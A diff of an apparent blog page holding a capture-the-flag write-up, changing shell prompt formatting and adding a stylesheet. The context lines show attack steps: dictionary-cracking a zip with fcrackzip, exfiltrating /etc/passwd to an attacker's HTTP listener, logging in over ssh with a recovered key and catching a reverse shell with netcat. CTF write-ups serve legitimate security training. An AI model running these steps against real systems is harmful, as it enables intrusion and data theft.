@@ -26,6 +26,7 @@
   
   <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/base-min.css">
   <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/pure-min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.4.0/jquery.fancybox.min.css" />
   
   
     <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/grids-responsive-min.css">
@@ -471,11 +472,11 @@ Table: access-users
 
 <p>So you can now access to the storage. There is an amount of useless files. The archive <code>CONFIDENTIEL.zip</code> is a trap. Be focus on the encrypted archive <code>recup.zip</code>.</p>
 
-<pre><code>th1b4ud@th1b4ud-pc $ unzip recup.zip 
+<pre><code>[th1b4ud@th1b4ud-pc ~]$ unzip recup.zip 
 Archive:  recup.zip
 [recup.zip] password.txt password: 
 
-th1b4ud@th1b4ud-pc $ unzip -l recup.zip 
+[th1b4ud@th1b4ud-pc ~]$ unzip -l recup.zip 
 Archive:  recup.zip
   Length      Date    Time    Name
 ---------  ---------- -----   ----
@@ -486,7 +487,7 @@ Archive:  recup.zip
 
 <p>Maybe the archive password is weak ? Try to break it with bruteforce attack with fcrackzip. Don&rsquo;t forget -u !</p>
 
-<pre><code>th1b4ud@th1b4ud-pc $ fcrackzip -v -u -D -p /home/th1b4ud/dictionaries/rockyou.txt recup.zip 
+<pre><code>[th1b4ud@th1b4ud-pc ~]$ fcrackzip -v -u -D -p /home/th1b4ud/dictionaries/rockyou.txt recup.zip 
 found file 'password.txt', (size cp/uc    271/   377, flags 9, chk 5aec)
 
 PASSWORD FOUND!!!!: pw == hackerman
@@ -550,7 +551,7 @@ Gourd-crown2-gao4-warp2 - Take On Me
 <li>Password <code>0twain-Mao0-flash-6Goof-Gent</code> decrypt disk <code>documents</code></li>
 </ul>
 
-<pre><code>th1b4ud@th1b4ud-pc $ tree /mnt
+<pre><code>[th1b4ud@th1b4ud-pc ~]$ tree /mnt
 |-- veracrypt1
 |   |-- $RECYCLE.BIN
 |   |   `-- desktop.ini
@@ -591,7 +592,7 @@ Gourd-crown2-gao4-warp2 - Take On Me
 
 <p><img src="/img/santhacklaus/arch13.png" alt="" /></p>
 
-<pre><code>th1b4ud@th1b4ud-pc $ tree /mnt
+<pre><code>[th1b4ud@th1b4ud-pc ~]$ tree /mnt
 /mnt
 |-- veracrypt1
     |-- $RECYCLE.BIN
@@ -610,7 +611,7 @@ Gourd-crown2-gao4-warp2 - Take On Me
 
 <p>OHOHOOHHO FU**** GODDD ! IT WORKS !!!</p>
 
-<pre><code>th1b4ud@th1b4ud-pc $ cat /mnt/veracrypt1/flag.txt
+<pre><code>[th1b4ud@th1b4ud-pc ~]$ cat /mnt/veracrypt1/flag.txt
 IMTLD{I_h4v3_N0th1ng_T0_h1d3}
 </code></pre>
 
@@ -702,7 +703,7 @@ Stop crying boy. Lets go pwn this illegal lottery to uphold the law.</p>
 
 <p>On your server (here <code>12.34.56.78</code>) you just have to launch a listener (netcat, python, apache2, like you want&hellip;). I will choose python because it will be helpull later.</p>
 
-<pre><code>th1b4ud@th1b4ud-pc $ python -m SimpleHTTPServer 4444
+<pre><code>[th1b4ud@th1b4ud-pc ~]$ python -m SimpleHTTPServer 4444
 Serving HTTP on 0.0.0.0 port 4444 ...
 51.75.202.113 - - [27/Dec/2018 23:18:20] &quot;GET / HTTP/1.0&quot; 200 -
 </code></pre>
@@ -755,7 +756,7 @@ Serving HTTP on 0.0.0.0 port 4444 ...
 
 <p>And on the attacker’s server we receive the extracted data</p>
 
-<pre><code>th1b4ud@th1b4ud-pc $ python -m SimpleHTTPServer 4444
+<pre><code>[th1b4ud@th1b4ud-pc ~]$ python -m SimpleHTTPServer 4444
 Serving HTTP on 0.0.0.0 port 4444 ...
 
 # This is the first GET request to obtain the malicious file
@@ -767,7 +768,7 @@ Serving HTTP on 0.0.0.0 port 4444 ...
 
 <p>So now, I think you are pro base64 decoder :p</p>
 
-<pre><code>th1b4ud@th1b4ud-pc $ echo &quot;cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovYmluL2ZhbHNlCg==&quot; | base64 -d
+<pre><code>[th1b4ud@th1b4ud-pc ~]$ echo &quot;cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovYmluL2ZhbHNlCg==&quot; | base64 -d
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -924,7 +925,7 @@ LAKwqo3/gOiPe8w5CRUWuDfuy04a81OBEF3Gv2pyVctg
 
 <p>HOHOH. READABLE ! What a huge mistake ! We can now connect to the server with user <code>dark_lottery</code>.</p>
 
-<pre><code class="language-bash">th1b4ud@th1b4ud-pc $ ssh dark_lottery@51.75.202.113 -p 2020 -i key
+<pre><code class="language-bash">[th1b4ud@th1b4ud-pc ~]$ ssh dark_lottery@51.75.202.113 -p 2020 -i key
 
     ___           _        __       _   _
    /   \__ _ _ __| | __   / /  ___ | |_| |_ ___ _ __ _   _
@@ -1186,7 +1187,7 @@ chmod +x shell.sh
 
 <p>And set your listener on your attacker&rsquo;s server</p>
 
-<pre><code>th1b4ud@th1b4ud-pc $ nc -lvp 4444
+<pre><code>[th1b4ud@th1b4ud-pc ~]$ nc -lvp 4444
 listening on [any] 4444 ...
 connect to [192.168.0.50] from 113.ip-51-75-202.eu [51.75.202.113] 34982
 bash: cannot set terminal process group (25128): Inappropriate ioctl for device
